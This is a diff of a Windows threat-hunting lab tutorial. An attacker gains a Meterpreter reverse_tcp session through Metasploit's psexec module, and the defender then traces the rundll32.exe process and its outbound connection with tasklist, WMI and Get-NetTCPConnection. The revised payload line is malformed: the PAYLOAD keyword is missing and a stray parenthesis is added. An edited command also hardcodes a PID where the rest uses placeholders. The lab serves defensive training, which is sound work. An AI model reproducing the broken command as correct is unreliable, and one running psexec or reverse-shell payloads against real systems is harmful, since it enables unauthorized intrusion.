@@ -99,7 +99,7 @@ use exploit/windows/smb/psexec
 We will continue by running this command to set the location of the payload:
 
 ```bash
-set PAYLOAD windows/meterpreter/reverse_tcp
+set windows/x64/meterpreter/reverse_tcp)
 ```
 
 We also need to set the **RHOST IP** for the Windows system by using the following command:
@@ -195,27 +195,42 @@ tasklist /m /fi "pid eq [PID]"
 >
 >**YOUR PID WILL BE DIFFERENT!**
 
-![](attachments/windowscli_tasklist.png)
+<img width="741" height="232" alt="2026-03-16_00-11" src="https://github.com/user-attachments/assets/c8e34f5e-41d5-48b8-967e-9ebf6da6aae6" />
 
 We can see the loaded **DLL's** above.  As we can see, there is not a whole lot to see here:
 
 Let's keep digging with **wmic**:
 
 ```bash
-wmic process where processid=[PID] get commandline
+(Get-WmiObject Win32_Process -Filter "ProcessId=7916").CommandLine
 ```
 
-![](attachments/windowscli_wmic.png)
+<img width="858" height="44" alt="2026-03-16_00-24" src="https://github.com/user-attachments/assets/b8ccc4ee-3b90-4aaa-a4e4-b83e501aed71" />
 
-Ahh!!  Now we can see that the file was launched from the **command line**!  We know this because there are no options.
+A perfectly normal **Windows DLL**... or so it would seem... once **Meterpreter** loads, it overwrites its own process command line in memory as an evasion technique. This is intentional anti-forensics behavior built into Meterpreter, and so, here, it spawns as `rundll32.exe` - a trusted **Windows Process**
 
-Let's see if we can see what spawned the process with **wmic**.
+To try to dig deeper, let's print every process making a network connection, a pretty hefty command:
 
 ```bash
-wmic process get name,parentprocessid,processid | select-string [PID]
+Get-NetTCPConnection -State Established | ForEach-Object {
+    $proc = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue
+    [PSCustomObject]@{
+        Process = $proc.Name
+        PID = $_.OwningProcess
+        LocalPort = $_.LocalPort
+        RemoteAddress = $_.RemoteAddress
+        RemotePort = $_.RemotePort
+    }
+}
 ```
 
-![](attachments/windowscli_selectstring.png)
+<img width="970" height="567" alt="1" src="https://github.com/user-attachments/assets/1b6d9e19-cf31-42ad-aa3a-0d4c91f68783" />
+
+Scroll until you see `rundll32.exe`
+
+<img width="322" height="113" alt="2" src="https://github.com/user-attachments/assets/1873ffbb-ef95-42ff-8499-c32b5bfe586c" />
+
+HA!! An outbound connection to the **attacker**!!!
 
 Lets go through the steps we took to hunt for a malicious process
 
